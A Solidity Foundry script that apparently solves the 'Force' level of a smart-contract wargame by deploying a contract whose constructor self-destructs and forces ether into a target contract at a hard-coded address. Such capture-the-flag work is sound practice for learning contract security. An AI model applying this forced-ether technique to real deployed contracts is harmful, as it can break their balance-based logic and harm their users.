// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DestroySelf {
    constructor(address recipitent) payable {
        selfdestruct(payable(recipitent));
    }
}

contract ForceSolution is Script {
    Force constant forceInstance =
        Force(0x504a6431a5357C4d84E5CA6c70624d228aC14EF3);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new DestroySelf{value: 1}(address(forceInstance));
        vm.stopBroadcast();
    }
}
